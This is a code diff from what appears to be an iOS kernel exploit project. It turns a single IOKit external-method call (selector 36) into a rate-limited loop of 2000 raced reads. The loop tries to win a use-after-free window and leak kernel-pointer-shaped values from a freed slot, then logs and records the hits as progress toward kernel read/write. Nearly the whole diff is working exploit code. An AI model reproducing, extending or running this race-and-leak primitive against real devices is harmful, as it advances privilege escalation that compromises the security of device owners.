@@ -149,25 +149,45 @@ static NSString *P122Ret(void) {
        on the device UC = IOConnectCallMethod(conn, 36, in=[rid, offset, len],
        1 scalar out). The out-scalar = what lives in the freed slot — the
        ColdForge 16/16 survivor oracle, now inside the freer chain. */
+    /* 4 — v4 RACED READ (p017 connection law): the natural pop is a race —
+       the one-shot sel36 lands before/after it; the p017-class hammer catches
+       the pop INSIDE its window. Rate-guarded (the A12X wedge law: p017's
+       30k/sec x 60s wedged the GPU-driver path — capped at 2000 calls,
+       1000us spacing, single thread). Every out classified by kernel-shape. */
     if (conn && rid) {
-        uint64_t outScalar = 0; uint32_t outCnt = 1;
-        uint64_t inS[3] = { rid, 0, 0x1000 };
-        kern_return_t kr36 = g_connectCall
-            ? g_connectCall((mach_port_t)conn, 36, inS, 3, NULL, 0,
-                            &outScalar, &outCnt, NULL, NULL)
-            : 0xe00002cc;
-        p122_log(@"[reader] sel36 kr=0x%x out=0x%llx", kr36, outScalar);
-        if (kr36 == 0) {
-            BOOL kshape = ((outScalar >> 36) == 0xfffffff);
-            p122_log(kshape
-                ? @"[+++] SHAPE-1 CANDIDATE: sel36 out of the freed slot reads a KERNEL-SHAPED value —"
-                  @" the §41 missing piece live; board records"
-                : @"[*] sel36 out = non-kernel-shaped occupant (ColdForge law: survivor, not KRW)");
-            if (kshape) {
-                [[P007Board shared] recordEvent:@"p122_swordforge" kind:@"fire"
-                                           detail:[NSString stringWithFormat:@"shape1 sel36 out=0x%llx", outScalar]
-                                           source:@"p122"];
+        uint64_t hits = 0, survivors = 0, kshapeHits = 0;
+        uint64_t lastShapedOuts[8] = {0}; uint32_t shapedN = 0;
+        for (int t = 0; t < 2000; t++) {
+            uint64_t outScalar = 0; uint32_t outCnt = 1;
+            uint64_t inS[3] = { rid, 0, 0x1000 };
+            kern_return_t kr36 = g_connectCall
+                ? g_connectCall((mach_port_t)conn, 36, inS, 3, NULL, 0,
+                                &outScalar, &outCnt, NULL, NULL)
+                : 0xe00002cc;
+            if (kr36 == 0) {
+                hits++;
+                if ((outScalar >> 36) == 0xfffffff) {
+                    kshapeHits++;
+                    if (shapedN < 8) lastShapedOuts[shapedN++] = outScalar;
+                } else {
+                    survivors++;
+                }
             }
+            usleep(1000);   /* wedge law: 2000 x 1000us = 2s max, single thread */
+            if (t == 500 || t == 1500) p122_log(@"[reader] raced: t=%d hits=%llu survivors=%llu kshape=%llu", t, hits, survivors, kshapeHits);
+        }
+        p122_log(@"[reader] RACE FINISH: hits=%llu survivors(non-kshape)=%llu kshapeHits=%llu", hits, survivors, kshapeHits);
+        for (uint32_t i = 0; i < shapedN && i < 4; i++)
+            p122_log(@"  [++] kshape out[%u]=0x%llx", i, lastShapedOuts[i]);
+        if (kshapeHits > 0) {
+            p122_log(@"[+++] SHAPE-1: kernel-shaped values raced out of the freed slot —"
+                     @" the §41 missing piece LIVE; board records");
+            [[P007Board shared] recordEvent:@"p122_swordforge" kind:@"fire"
+                                       detail:[NSString stringWithFormat:@"shape1-raced kshape=%llu last=0x%llx", kshapeHits, lastShapedOuts[0]]
+                                       source:@"p122"];
+        } else {
+            p122_log(@"[*] 2000 raced reads: zero kernel-shaped occupants —"
+                     @" the zone's natural population is user-class (the glue doc's ceiling, now measured)");
         }
     } else {
         p122_log(@"[-] conn/rid derivation failed (0x%x/0x%x) — sel36 reader skipped", conn, rid);
